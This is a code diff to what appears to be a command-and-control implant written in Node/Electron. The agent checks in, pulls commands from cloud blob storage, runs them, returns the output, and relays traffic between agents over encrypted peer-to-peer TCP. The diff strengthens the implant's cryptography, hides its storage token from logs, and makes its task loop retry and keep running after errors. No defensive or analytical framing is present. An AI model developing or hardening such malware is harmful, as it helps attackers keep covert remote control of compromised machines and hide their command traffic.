@@ -129,7 +129,7 @@ app.on('ready', async () => {
         debug('[READY] Storage config:');
         debug(`[READY] |_ storageAccount: ${global.agent.storageAccount}`);
         debug(`[READY] |_ metaContainer: ${global.agent.metaContainer}`);
-        debug(`[READY] |_ sasToken: ${global.agent.sasToken}`);
+        debug('[READY] |_ sasToken: [REDACTED]');
         debug('[READY] Agent object properties:');
         debug(`[READY] |_ agentid: ${global.agent.agentid}`);
         debug(`[READY] |_ checkin: ${global.agent.checkin}`);
@@ -201,11 +201,10 @@ class TCPAgent {
         this.onErrorCallback = null;
     }
 
-    async generateKeyAndIV(password) {
-        const salt = 'fixed-salt';
+    async generateKeyAndIV(password, salt = crypto.randomBytes(16).toString('hex')) {
         const key = crypto.pbkdf2Sync(password, salt, 100000, 32, 'sha256');
-        const iv = crypto.pbkdf2Sync(password, salt + 'iv', 100000, 16, 'sha256').slice(0, 16);
-        return { key, iv };
+        const iv = crypto.randomBytes(16);
+        return { key, iv, salt };
     }
 
     async encrypt(data, key, iv) {
@@ -273,7 +272,11 @@ class TCPAgent {
             
             this.p2p_aes = await this.generateKeyAndIV(this.config.password);
             const encrypted_message = await this.encrypt(this.config.password, this.p2p_aes.key, this.p2p_aes.iv);
-            const encoded_message = await this.base64Encode(encrypted_message);
+            const encoded_message = await this.base64Encode(JSON.stringify({
+                salt: this.p2p_aes.salt,
+                iv: this.p2p_aes.iv.toString('hex'),
+                ciphertext: encrypted_message
+            }));
             this.client.write(encoded_message + '\n');
 
             if (this.onConnectCallback) {
@@ -286,8 +289,13 @@ class TCPAgent {
 
     setupEventHandlers() {
         this.client.on('data', async (data) => {
+            let currentRequest = null;
             const decoded_message = await this.base64Decode(data.toString());
             const decrypted_message = await this.decrypt(decoded_message, this.p2p_aes.key, this.p2p_aes.iv);
+            if (decrypted_message === null) {
+                debug('Dropping invalid encrypted message');
+                return;
+            }
             this.buffer += decrypted_message;
             
             const messages = this.buffer.split('\n');
@@ -307,7 +315,7 @@ class TCPAgent {
 
                 try {
                     // Parse the web request from server
-                    const currentRequest = JSON.parse(message);
+                    currentRequest = JSON.parse(message);
                     
                     // Handle x-ms-meta-link header if present
                     if (currentRequest.headers && currentRequest.headers['x-ms-meta-link']) {
@@ -500,11 +508,11 @@ class TCPServer {
             this.server = net.createServer((socket) => {
                 let isAuthenticated = false;
                 let decryptedMessage = '';
+                let sessionCrypto = null;
 
                 socket.on('data', async (data) => {
                     decryptedMessage = '';
                     const message = data.toString();
-                    global.p2p_aes = await generateKeyAndIV(this.password);
                     try {
                         const decodedMessage = await func_Base64_Decode(message);
                         if (!decodedMessage) {
@@ -512,8 +520,20 @@ class TCPServer {
                             socket.end();
                             return;
                         }
-                        decryptedMessage = await func_Decrypt(decodedMessage, global.p2p_aes.key, global.p2p_aes.iv);
-                        decryptedMessage = decryptedMessage;
+                        if (!sessionCrypto) {
+                            const handshake = JSON.parse(decodedMessage);
+                            if (!handshake.salt || !handshake.iv || !handshake.ciphertext) {
+                                throw new Error('Invalid P2P handshake');
+                            }
+                            sessionCrypto = await generateKeyAndIV(this.password, handshake.salt);
+                            sessionCrypto.iv = Buffer.from(handshake.iv, 'hex');
+                            if (sessionCrypto.iv.length !== 16) throw new Error('Invalid P2P IV');
+                        }
+                        global.p2p_aes = sessionCrypto;
+                        const ciphertext = !isAuthenticated
+                            ? JSON.parse(decodedMessage).ciphertext
+                            : decodedMessage;
+                        decryptedMessage = await func_Decrypt(ciphertext, sessionCrypto.key, sessionCrypto.iv);
                         if (!decryptedMessage) {
                             debug('[TCP-SERVER] Failed to decrypt message');
                             socket.end();
@@ -752,15 +772,15 @@ function generateAESKey()
 }
 
 // Function to generate key and IV from a password
-async function generateKeyAndIV(password) {
-    // Use PBKDF2 to derive a key from the password
-    const salt = 'fixed-salt'; // In production, you might want to use a random salt
+async function generateKeyAndIV(password, salt = crypto.randomBytes(16).toString('hex')) {
+    // Derive a session key from a per-session random salt and use a random IV.
     const key = crypto.pbkdf2Sync(password, salt, 100000, 32, 'sha256'); // 32 bytes for AES-256 key
-    const iv = crypto.pbkdf2Sync(password, salt + 'iv', 100000, 16, 'sha256').slice(0, 16); // 16 bytes for IV
+    const iv = crypto.randomBytes(16);
     
     return {
         key: key,
-        iv: iv
+        iv: iv,
+        salt: salt
     };
 }
 
@@ -2011,10 +2031,14 @@ async function parseTask(encryptedTask) {
 
 async function DoTask(task) {
     try {
+        if (!task || typeof task.command !== 'string' || !task.command.trim()) {
+            debug('[TASK] Invalid task payload');
+            return false;
+        }
         let command_output = "";
         const argv = await func_Split_Quoted_String(task.command);
         if (!argv || argv.length === 0) {
-            return;
+            return false;
         }
         
         command_output = await func_Command_Handler(task, argv);
@@ -2024,8 +2048,10 @@ async function DoTask(task) {
             command_output = await func_Base64_Encode(command_output);
             await send_output(global.agent.container.name, task.outputChannel, command_output);
         }
+        return true;
     } catch (error) {
         debug(`${error} ${error.stack}`);
+        return false;
     }
 }
 
@@ -2111,6 +2137,19 @@ async function reinitializeAgent() {
 }
 
 async function TaskLoop() {
+  while (true) {
+    try {
+      await taskLoopIteration();
+      return;
+    } catch (error) {
+      debug(`[TASKLOOP] Recoverable error: ${error} ${error.stack}`);
+      global.init = false;
+      await new Promise(resolve => setTimeout(resolve, 10000));
+    }
+  }
+}
+
+async function taskLoopIteration() {
   try{
     debug(`[TASKLOOP] Starting task handler`);
     while (true) {
@@ -2163,8 +2202,7 @@ async function TaskLoop() {
         }
     }
   }catch(error){
-    debug(`${error} ${error.stack}`);
-    await TaskLoop();
+    throw error;
   }
 }
 
@@ -2172,11 +2210,13 @@ async function HandleTask() {
     try {
         let response = await func_Blob_Read(global.agent.container.name ,global.agent.container.blobs['in']);
         if (response.status === 200) {
-            await clearBlob(global.agent.container.name, global.agent.container.blobs['in']);
             if (response.data && response.data != null && response.data != undefined && response.data != "") {
                 let task = await parseTask(response.data);
-                await DoTask(task);
+                if (!task) return false;
+                const completed = await DoTask(task);
+                if (!completed) return false;
             } 
+            await clearBlob(global.agent.container.name, global.agent.container.blobs['in']);
             return true;
         }else{
             return false;
